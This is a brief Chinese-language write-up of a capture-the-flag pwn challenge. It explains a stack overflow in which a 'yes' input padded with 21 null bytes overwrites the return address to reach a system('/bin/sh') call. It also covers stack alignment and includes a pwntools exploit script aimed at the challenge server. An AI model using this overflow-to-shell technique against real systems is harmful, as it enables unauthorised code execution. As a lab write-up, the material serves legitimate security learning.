# helloctf_revenge

這題沿用`helloctf`的思路，要執行到`main`函式最後的 ret 才會將`stack`頂端的執行位置移到`$rdi`。

## 難處

1. 輸入不能超過 16 個字元。
2. 會判斷輸入是否為剛剛好為"yes"。
3. `magic`函式裡用的是`system("/bin/sh")`，會有執行時`stack`裡記憶體位置要`address % 16 == 0`的要求，所以不能直接導向函式的頭，因為 push 會使得`stack`變動 4 bits。

## 解法

1. 判斷 string 結束會有一個`'\0'`。
2. `system("/bin/sh")`解決方法是將 `main`裡 ret 時直接指向`system("/bin/bash")`那行，而不是指向`magic`函式的頭。

## 程式碼

先用 for 迴圈爆出 `'\0'` 要幾個字元會 overflow 到蓋過目標`stack`，得 21 個

```python
from pwn import *

r = remote("ctf.adl.tw", 10000)

r.recvuntil("Do you like VTuber?")
r.sendline(flat("yes", "\0" * 21, p64(0x40123B)))

r.interactive()
```
